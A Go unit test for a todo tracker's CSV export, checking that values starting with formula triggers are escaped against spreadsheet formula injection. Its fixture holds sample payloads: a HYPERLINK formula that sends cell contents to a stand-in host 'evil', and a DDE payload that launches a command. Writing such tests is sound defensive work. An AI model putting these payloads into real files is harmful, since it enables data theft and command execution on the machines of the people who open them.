package service_test

import (
	"bytes"
	"encoding/csv"
	"strings"
	"testing"
	"time"

	"github.com/jdel/gotracks/internal/domain"
	"github.com/jdel/gotracks/internal/service"
)

// The CSV export exists to be opened in a spreadsheet, where a cell starting
// with "=" and friends is evaluated as a formula rather than shown as text.
func TestWriteCSVNeutralisesFormulas(t *testing.T) {
	e := &service.Export{
		Contexts: []*domain.Context{{ID: 1, Name: "@home"}},
		Todos: []*domain.Todo{{
			ID:          1,
			ContextID:   1,
			State:       domain.StateActive,
			Description: `=HYPERLINK("http://evil/?"&A1,"click me")`,
			Notes:       `+cmd|' /C calc'!A0`,
			Tags:        []string{"@SUM(1+1)"},
			CreatedAt:   time.Now(),
		}},
	}

	var buf bytes.Buffer
	if err := e.WriteCSV(&buf); err != nil {
		t.Fatalf("write csv: %v", err)
	}
	rows, err := csv.NewReader(&buf).ReadAll()
	if err != nil {
		t.Fatalf("parse csv: %v", err)
	}
	if len(rows) != 2 {
		t.Fatalf("want header plus one row, got %d rows", len(rows))
	}

	for i, cell := range rows[1] {
		if cell == "" {
			continue
		}
		if strings.ContainsRune("=+-@\t\r", rune(cell[0])) {
			t.Errorf("column %d (%q) starts with a formula trigger", i, cell)
		}
	}
	// The content itself must survive, only prefixed.
	if !strings.Contains(rows[1][1], "HYPERLINK") {
		t.Errorf("description was mangled rather than escaped: %q", rows[1][1])
	}
}
